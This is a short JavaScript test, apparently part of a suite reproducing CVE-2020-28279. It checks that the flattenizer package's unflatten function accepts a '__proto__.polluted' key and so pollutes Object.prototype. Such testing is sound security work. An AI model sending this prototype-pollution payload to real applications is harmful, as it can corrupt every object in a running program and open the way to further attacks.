//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
test("prototype pollution in flattenizer", () => {
    
    var flattenizer = require("flattenizer")
    obj = {};

    expect({}.polluted).toBe(undefined);
    

    flattenizer.unflatten({'__proto__.polluted': "yes"});
    expect({}.polluted).toBe("yes");
  });